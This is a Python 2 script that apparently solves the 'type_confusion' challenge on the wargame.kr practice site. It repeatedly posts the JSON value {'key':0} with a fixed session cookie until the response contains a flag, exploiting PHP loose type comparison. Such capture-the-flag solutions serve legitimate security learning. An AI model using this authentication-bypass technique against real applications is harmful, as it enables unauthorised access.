'''
Created on 2016-3-21

@author: wenhuizone
'''
import urllib
import urllib2
import sys

url = "http://wargame.kr:8080/type_confusion/index.php"

data = '{"key":0}'
data = 'json='+urllib.quote(data)

response = ""

while "flag" not in response:
    opener = urllib2.build_opener(urllib2.HTTPHandler)
    request = urllib2.Request(url,data)
    request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
    request.add_header('Cookie', 'PHPSESSID=v49q7ovgd3dh0bbu5dotlauac0')
    request.get_method = lambda:'POST'
    response = opener.open(request)
    response = str(response.read())

    print response